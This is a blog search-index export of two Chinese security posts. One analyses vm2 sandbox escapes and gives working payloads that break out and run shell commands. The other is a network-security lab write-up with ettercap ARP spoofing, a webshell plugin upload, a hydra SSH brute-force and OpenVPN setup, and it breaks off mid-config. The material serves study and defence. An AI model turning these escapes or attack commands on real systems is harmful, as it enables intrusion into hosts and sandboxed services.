<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>vm2沙箱逃逸分析</title>
      <link href="/posts/9c09dcd4/"/>
      <url>/posts/9c09dcd4/</url>
      
        <content type="html"><![CDATA[<p>本文首发于安全客 <a href="https://www.anquanke.com/post/id/207291" target="_blank" rel="noopener">https://www.anquanke.com/post/id/207291</a></p><h1 id="vm2沙箱逃逸分析"><a href="#vm2沙箱逃逸分析" class="headerlink" title="vm2沙箱逃逸分析"></a>vm2沙箱逃逸分析</h1><p>前言：vm2中在版本的更迭中，存在多种逃逸方法，可以参考 <a href="https://github.com/patriksimek/vm2/issues?q=is%3Aissue+author%3AXmiliaH+is%3Aclosed" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues?q=is%3Aissue+author%3AXmiliaH+is%3Aclosed</a> 但是 issue中都没有给出具体的分析，本文通过几个典型的案例来分析这些代码是如何逃逸出vm2的</p><blockquote><p>注：需要使用git进行回退 <code>git reset --hard 7ecabb1</code></p></blockquote><h2 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h2><p>代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">Object.prototype.has=(t,k)=&gt;&#123;</span></span><br><span class="line"><span class="string">process = t.constructor("return process")();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"" in Buffer.from;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("whoami").toString()`</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看这个案例前，首先需要补充一点es6 proxy的知识 <a href="https://es6.ruanyifeng.com/?search=weakmap&amp;x=0&amp;y=0#docs/proxy" target="_blank" rel="noopener">https://es6.ruanyifeng.com/?search=weakmap&amp;x=0&amp;y=0#docs/proxy</a> (大神可以略过)</p><p>先看一段代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> handler = &#123;</span><br><span class="line">    <span class="keyword">get</span> () &#123;</span><br><span class="line">     <span class="built_in">console</span>.log(<span class="string">"get"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> target = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> proxy = <span class="keyword">new</span> <span class="built_in">Proxy</span>(target, handler);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">Object</span>.prototype.has = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"has"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  proxy.a; <span class="comment">//触发get</span></span><br><span class="line">  <span class="string">""</span> <span class="keyword">in</span> proxy; <span class="comment">//触发has，这个has是在原型链上定义的</span></span><br></pre></td></tr></table></figure><p>在对象 <code>target</code> 上定义了 <code>get</code> 操作，会拦截对象属性的读取，所以当访问 <code>proxy.a</code> 时，会打印出 <code>get</code></p><p>但是当执行 <code>&quot;&quot; in proxy</code> 时，也会被 <code>has</code>方法拦截，此时，我们虽然没有直接在 <code>target</code> 对象上定义 <code>has</code> 拦截操作，即代理的方法是可以被继承的。</p><p>回到vm2逃逸的代码，vm2中实际运行的代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> process;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.prototype.has = <span class="function"><span class="keyword">function</span> (<span class="params">t, k</span>) </span>&#123;</span><br><span class="line">    process = t.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="string">""</span> <span class="keyword">in</span> Buffer.from;</span><br><span class="line">process.mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString()</span><br></pre></td></tr></table></figure><p><code>Buffer.from</code> 是一个代理对象，vm2的作者一开始并没有给vm2内部的Object 加上 has方法，所以我们可以自己给 <code>Object</code> 对象的原型上添加 <code>has</code> 方法，这时候运行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">""</span> <span class="keyword">in</span> Buffer.from;</span><br></pre></td></tr></table></figure><p>就会去执行我们定义好的has方法，由于 <code>proxy</code> 的机制，参数 <code>t</code> 是 <code>function Buffer.from</code> ，这个function是在外部的，其上下文是 nodejs 的global下，所以访问其 <code>constructor</code> 属性就获取到了外部的 <code>Function</code>，从而拿到外部的 <code>process</code></p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/image-20200531101107708.png" alt></p><p>而开发者的修复方案：添加上 has 方法</p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/clipboard-1590891160012.png" alt></p><p>可以看到，没有修复之前，<code>Buffer.from</code> 是没有拦截 <code>has</code> 操作的</p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/clipboard-1590891167907.png" alt></p><p>而修复之后：</p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/clipboard.png" alt></p><p>由于 <code>Buffer.from</code> 中已经存在了 has 方法，所以不会去原型链上查找</p><h2 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h2><p>代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">Object.defineProperty(Buffer.from(""), "", &#123;get set()&#123;</span></span><br><span class="line"><span class="string">Object.defineProperty(Object.prototype,"get",&#123;get()&#123;</span></span><br><span class="line"><span class="string">throw x=&gt;x.constructor("return process")();</span></span><br><span class="line"><span class="string">&#125;&#125;);</span></span><br><span class="line"><span class="string">return ()=&gt;&#123;&#125;;</span></span><br><span class="line"><span class="string">&#125;&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("id").toString();`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样地，需要补充一点js的知识：</p><p>js的对象中，存在三种不同的属性：数据属性，访问器属性和内部属性。我们只看数据属性和访问器属性</p><p>数据属性和访问器属性都存在 <code>[[Enumerable]]</code> 和 <code>[[Configurable]]</code> 特性</p><p>不同点：以下特性属于数据属性：</p><ul><li><code>[[Value]]</code>：该属性的属性值，默认为<code>undefined</code>。</li><li><code>[[Writable]]</code>：是一个布尔值，表示属性值（<code>value</code>）是否可改变（即是否可写），默认为<code>true</code>。</li></ul><p>以下特性属于访问器属性</p><ul><li><p><code>[[Get]]</code>：是一个函数，表示该属性的取值函数（getter），默认为<code>undefined</code></p></li><li><p><code>[[Set]]</code>：是一个函数，表示该属性的存值函数（setter），默认为<code>undefined</code></p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    prop: <span class="keyword">let</span> obj = &#123;</span><br><span class="line">    prop:<span class="number">123</span>,</span><br><span class="line">    Writable: <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> jbo = &#123;</span><br><span class="line">    <span class="keyword">get</span> prop()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"get"</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">set</span> prop(val)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"set"</span>+val);        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(obj.prop); <span class="comment">//123</span></span><br><span class="line"><span class="built_in">console</span>.log(jbo.prop); <span class="comment">//get</span></span><br></pre></td></tr></table></figure><p>我们也可以通过 <code>Object.defineProperty</code> 来设置对象的访问器属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">"prop"</span>, &#123;</span><br><span class="line">    <span class="keyword">get</span>()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"get"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(obj.prop);</span><br></pre></td></tr></table></figure><p>我们还可以这样写</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">"prop"</span>, &#123;</span><br><span class="line">    <span class="keyword">get</span> <span class="keyword">get</span>()&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"get1"</span>); <span class="comment">//get1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="keyword">return</span> <span class="string">"get2"</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(obj.prop); <span class="comment">//get2</span></span><br></pre></td></tr></table></figure><p>在这种情况下，会先执行 <code>get()</code> 函数，打印 <code>get1</code>，返回一个函数，作为 <code>prop</code> 属性的 getter，之后访问 <code>obj.prop</code> 时，就会打印 <code>get2</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">get</span>()&#123;</span><br><span class="line">       <span class="built_in">console</span>.log(<span class="string">"get1"</span>);</span><br><span class="line">       <span class="keyword">return</span> <span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="keyword">return</span> <span class="string">"get2"</span>&#125;;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>同理：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">"prop"</span>, &#123;</span><br><span class="line">    <span class="keyword">get</span> <span class="keyword">set</span>()&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"set1"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="function">(<span class="params">val</span>)=&gt;</span>&#123;<span class="built_in">console</span>.log(<span class="string">"set2"</span>)&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">obj.prop = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>此时会先执行一次 <code>set()</code> 函数打印出 <code>set1</code>，同时设置 <code>prop</code> 属性的 setter 为 <code>(val)=&gt;{console.log(&quot;set2&quot;)}</code> 之后执行 <code>obj.prop  = 1</code> 时，就会打印 <code>set2</code>;</p><p>那么回过头来看vm2逃逸的代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> process;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> a = Buffer.from(<span class="string">""</span>)</span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(a, <span class="string">""</span>, &#123;</span><br><span class="line">        <span class="keyword">get</span> <span class="keyword">set</span>() &#123;</span><br><span class="line">            <span class="built_in">Object</span>.defineProperty(<span class="built_in">Object</span>.prototype, <span class="string">"get"</span>, &#123;</span><br><span class="line">                <span class="keyword">get</span>: function <span class="keyword">get</span>() &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> x.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">                    &#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">return</span> <span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    process = e(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行的过程如下：</p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/vm2-Page-6.png" alt></p><p>参考前文 vm2 实现原理分析，此时得到的a是一个代理对象，当我们在a上定义新属性的时候，被代理的 <code>defineProperty</code> 拦截</p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/clipboard-1591427976885.png" alt></p><p>检测传入的 <code>descriptor</code> 上是否设置了 get和set，如果是，调用外部的 <code>host.Object.defineProperty</code> 去实现设置对象属性的</p><p>但是在执行 <code>descriptor.get</code> 的时候，由于 <code>nodejs</code>是异步的，此时已经执行了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.defineProperty(<span class="built_in">Object</span>.prototype, <span class="string">"get"</span>, &#123;</span><br><span class="line">                <span class="keyword">get</span>: function <span class="keyword">get</span>() &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> x.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">                    &#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br></pre></td></tr></table></figure><p>也就是说，<code>descriptor.get</code> 会沿着原型链寻找到 <code>get</code>, 并且抛出异常，<code>throw x=&gt;x.constructor(&quot;return process&quot;)();</code></p><p>这个抛出的异常，最先被vm2内部捕获到，就是图中的e</p><p>vm2 需要将其包装成一个代理对象之后，继续抛出，所以这个异常被我们写的代码捕获到</p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/clipboard-1591427979718.png" alt></p><p>vm2抛出的异常，被我们的代码捕获到</p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/clipboard-1591427981854.png" alt></p><p>然后我们将其作为函数来调用，那就会触发这个函数代理对象的 <code>apply</code> 方法</p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/clipboard-1591427984587.png" alt></p><p>这里的 <code>target</code> 就是 <code>x=&gt;x.constructor(&#39;return process&#39;)()</code></p><p><code>context</code> 是函数的上下文代理，通过 <code>Decontextify.value</code> 之后是 <code>underfined</code></p><p><code>args</code> 是函数的参数代理，其值为 <code>() =&gt; {}</code></p><p>真正的函数调用发生在</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Contextify.value(fnc.apply(context, Decontextify.arguments(args)));</span><br></pre></td></tr></table></figure><p>这里可以做一下拆分</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> func_arg = Decontextify.arguments(args);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fnc_result = fnc.apply(context, func_arg);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> res = Contextify.value(fnc_result);</span><br></pre></td></tr></table></figure><p>逻辑上看，先将函数的参数做一次处理，然后通过反射调用函数，再将得到的结果包装成代理</p><p>问题出在对函数的参数处理上，此处的函数参数为 <code>() =&gt; {}</code> ，是一个函数，并不是代理对象</p><p>所以 <code>Decontextify</code> 将其做了一次包装，使之成为一个代理对象</p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/clipboard-1591427987679.png" alt></p><p>然而问题在于，这个函数的代理对象中的get方法的实现</p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/clipboard-1591427990942.png" alt></p><p>当访问 <code>constructor</code> 属性的时候，得到的是 <code>host.Function</code></p><p>如图：</p><p><img src= "/img/loading.gif" data-src="/posts/9c09dcd4/clipboard-1591427993085.png" alt></p><p>这就导致逃溢出沙箱了</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vm2 </tag>
            
            <tag> 沙箱逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网安实验综合</title>
      <link href="/posts/9fa2ed28/"/>
      <url>/posts/9fa2ed28/</url>
      
        <content type="html"><![CDATA[<p>实验拓扑图</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard.png" alt></p><h2 id="任务1"><a href="#任务1" class="headerlink" title="任务1"></a>任务1</h2><p>192.168.1.3 定时登录 192.168.1.4 的ftp服务，通过分析流量包可以发现</p><p>使用 ettercap 进行网络嗅探</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -i eth1 -Tq -L sniffeddata -M arp:remote &#x2F;&#x2F;192.168.1.4&#x2F;21&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319617635.png" alt></p><p>登录ftp服务即可得到 key.txt 内容</p><p>同时还发现 192.168.1.4 存在WebLogic 反序列化漏洞，工具包位于 /home/Hack 目录下</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319617624.png" alt></p><p>读到 key1.txt 内容</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319617828.png" alt></p><h2 id="任务2"><a href="#任务2" class="headerlink" title="任务2"></a>任务2</h2><p>192.168.1.5 运行了 wordpress 站点，访问得到 key2.txt</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319618084.png" alt></p><p>这居然是wordpress后台的密码。(这里没办法利用wordpress-rce那个脚本)</p><p>登录到wordpress后台需要 getshell</p><p>这里下载一个 wordpress 的主题，我下载了这个 <a href="https://wordpress.org/plugins/simple-shortcode-block/" target="_blank" rel="noopener">https://wordpress.org/plugins/simple-shortcode-block/</a></p><p>然后将其中的index.php 修改为一句话木马，通过后台上传，这个时候即getshell</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319618735.png" alt></p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319619225.png" alt></p><p>下载 username.txt 即可</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319618894.png" alt></p><h2 id="任务3"><a href="#任务3" class="headerlink" title="任务3"></a>任务3</h2><p>使用hydra 暴力破解 192.168.1.6 的ssh口令，已经知道了口令形式为 hacker***</p><p>直接写个脚本生成下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">password = <span class="string">"hacker"</span></span><br><span class="line"></span><br><span class="line">a = <span class="string">"0123456789"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"pass.txt"</span>, <span class="string">"w"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> a:</span><br><span class="line">            ppp = password + i + j + k</span><br><span class="line">            f.writelines(ppp)</span><br><span class="line">            f.writelines(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>爆破出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L users.txt -P password.txt -t 1 -vV -e ns 192.168.1.104 ssh</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319619093.png" alt></p><p>登录之后发现有两块网卡</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319619298.png" alt></p><p>nmap扫描一下</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319619549.png" alt></p><h2 id="任务4"><a href="#任务4" class="headerlink" title="任务4"></a>任务4</h2><p>在 192.168.1.6(centos) 上配置openvpn服务端，在192.168.1.5(windows) 上连接</p><p>通过 scp 拷贝文件到 192.168.1.6 上</p><p>之后yum install一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum localinstall openvpn-2.4.4-1.el7.x86_64.rpm  easy-rsa-2.2.2-1.el5.noarch.rpm  lz4-1.7.5-2.el7.x86_64.rpm pkcs11-helper-1.11-3.el7.x86_64.rpm</span><br></pre></td></tr></table></figure><p>然后开始配置vpn</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@simple openvpn]# cp &#x2F;usr&#x2F;share&#x2F;doc&#x2F;openvpn-2.4.4&#x2F;sample&#x2F;sample-config-files&#x2F;server.conf &#x2F;etc&#x2F;openvpn&#x2F;</span><br><span class="line">[root@simple openvpn]# cd &#x2F;etc&#x2F;openvpn&#x2F;</span><br><span class="line">[root@simple openvpn]# ls</span><br><span class="line">client  server  server.conf</span><br></pre></td></tr></table></figure><p>修改配置文件</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319619430.png" alt></p><p>生成ca</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319619490.png" alt></p><p>生成服务端证书</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319619589.png" alt></p><p>开启openvpn</p><p><img src= "/img/loading.gif" data-src="/posts/9fa2ed28/clipboard-1590319619654.png" alt></p><p>windows配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">-&gt;|##############################################</span><br><span class="line"># Sample client-side OpenVPN 2.0 config file #</span><br><span class="line"># for connecting to multi-client server.     #</span><br><span class="line">#                                            #</span><br><span class="line"># This configuration can be used by multiple #</span><br><span class="line"># clients, however each client should have   #</span><br><span class="line"># its own cert and key files.                #</span><br><span class="line">#                                            #</span><br><span class="line"># On Windows, you might want to rename this  #</span><br><span class="line"># file so it has a .ovpn extension           #</span><br><span class="line">##############################################</span><br><span class="line"></span><br><span class="line"># Specify that we are a client and that we</span><br><span class="line"># will be pulling certain config file directives</span><br><span class="line"># from the server.</span><br><span class="line">client</span><br><span class="line"></span><br><span class="line"># Use the same setting as you are using on</span><br><span class="line"># the server.</span><br><span class="line"># On most systems, the VPN will not function</span><br><span class="line"># unless you partially or fully disable</span><br><span class="line"># the firewall for the TUN&#x2F;TAP 